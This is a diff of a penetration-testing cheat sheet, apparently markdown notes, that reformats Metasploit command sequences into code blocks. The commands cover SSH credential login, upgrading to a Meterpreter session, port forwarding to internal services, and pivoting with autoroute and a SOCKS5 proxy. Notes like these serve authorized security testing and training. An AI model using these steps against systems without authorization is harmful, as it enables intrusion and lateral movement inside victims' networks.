@@ -14,41 +14,45 @@
 
 ### 1) With SSH login
 
- - use auxiliary/scanner/ssh/ssh_login
+    use auxiliary/scanner/ssh/ssh_login
 
- - set rhosts RHOSTS
+    set rhosts RHOSTS
 
- - set username USERNAME
+    set username USERNAME
 
- - set password PASSWORD
+    set password PASSWORD
 
- - exploit
+    exploit
 
- - sessions -u 1 (Upgrade to Meterpreter session. Creates an EXTRA session with meterpreter)
+### Upgrade to Meterpreter session. Creates an EXTRA session with meterpreter
 
- - sessions 2
+    sessions -u 1 
 
- - netstat -antp (Check for applications that run internally within the target)
+    sessions 2
 
- - portfwd add -l LOCAL_PORT -p TARGET_PORT -r 127.0.0.1
+### Check for applications that run internally within the target
+
+    netstat -antp 
+
+    portfwd add -l LOCAL_PORT -p TARGET_PORT -r 127.0.0.1
 
 ## Tunneling with Metasploit
 
 ### 1) autoroute (Deprecated)
 
- - sessions
+    sessions
 
- - use post/multi/manage/autoroute
+    use post/multi/manage/autoroute
 
- - set session SESSION_NUM
+    set session SESSION_NUM
 
- - exploit
+    exploit
 
- - use auxiliary/server/socks5
+    use auxiliary/server/socks5
 
- - set srvhost 127.0.0.1
+    set srvhost 127.0.0.1
 
- - exploit
+    exploit
 
 ### Then go to web browser in Kali and make the manual proxy configuration settings
 
